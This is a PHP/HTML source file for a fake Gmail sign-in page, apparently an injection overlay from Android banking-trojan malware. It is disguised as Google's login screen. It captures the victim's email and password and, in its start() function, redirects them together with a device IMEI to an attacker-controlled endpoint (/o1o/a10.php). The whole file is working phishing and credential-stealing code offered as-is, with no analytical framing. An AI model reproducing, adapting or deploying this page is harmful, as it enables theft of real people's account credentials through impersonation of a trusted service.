<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Google Mail</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script type="text/javascript" src="GoogleMail/js/jquery-2.1.4.min.js"></script>
	<script src="GoogleMail/js/cat.functions.js"></script>
	<link rel="stylesheet" href="GoogleMail/css/cat.style.css" type="text/css" media="all">
    <link rel="stylesheet" href="GoogleMail/css/style.css" media="screen" type="text/css"/>
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

<script>

	$(document).ready(function() {

		var email = getGoogleAccount();
		if (email != '') {
			$("input[name='email']").val( email );
			$('#mail_title').html( email );

			switchStep(1, false);
		}

	});

    function performEmail() {
        var email = $("#email");
		var emailValue = email.val();
		if (emailValue == '') return false;
		var result = emailValue.split('@')[0] + '@gmail.com';
		email.val(result);
        $('#mail_title').html(result);

		switchStep(1, false);
    }

	function start() {
       var URL__='<?php echo $URL;?>';
	   var IMEI='<?php echo $IMEI_country;?>';

	   var gmail = $('#email').val();
	   var password = $('#password').val();

	  location.replace(URL__+'/o1o/a10.php?p=' + IMEI + '|Injection_4|Gmail|'+ gmail + '|' + password);

    }

</script>

<div id="topbar"  style="background-color: white;">
<center>	<img src="GoogleMail/images/logo.png" style="margin: 25px auto 5px; width: 85px; height: 30px;" /></center>
<br>
</div>

<center>
<p style="color:black; font-size:20px;">Sign in</p>
</center>
<center>
<p style="color:black; font-size:16px;">to continue to Gmail</p>
</center>
<br>

<div id="login-form" style="text-align: center;">

	<div id="cat-error">
		<span>Authentication failed<br/> or timed out</span>
		<input type="button" value="Try enter again" onClick="tryEnterAgain();"/>
	</div>

	<div id="cat-forms">

		<form id="cat-step-1" class="cat-start-step">

			<input type="text" id="email" name="email" placeholder="Email or phone"/>
    <br></br>
      <p style="color:blue; font-size:12px; margin-left:-140px;">Forgot email?</p>
      <br></br>
      <br></br>
      <br></br>
      <p style="color:blue; font-size:13px; margin-left:-155px;">Create account</p>
      <input type="button" style="background-color: blue;width:100px; height:40px; margin-top:-35px;" value="Next" onClick="performEmail()"/>

		</form>

		<form id="cat-step-2" class="cat-step-block">

			<div id="mail_title" style="font-size: 14px; padding-bottom: 3px;"></div>
			<input type="password" style="color: blue;" name="password" id="password" placeholder="Enter your Password"/>
      <br></br>
      <p style="color:blue; font-size:12px; margin-left:-140px;">Forgot password?</p>
			<input type="button" style="background-color: blue;width:100px; height:40px; margin-top:0px;" value="Sign in" onClick="start()"/>
		</form>

		<form id="cat-step-3" class="cat-last-step" style="text-align: center;">
			<span>Authentication failed<br/> or timed out</span>
			<input type="button" value="Try enter again" style="float: none;"
				onClick="closeWindow()"/>
		</form>

	</div>

</div>

</body>
</html>
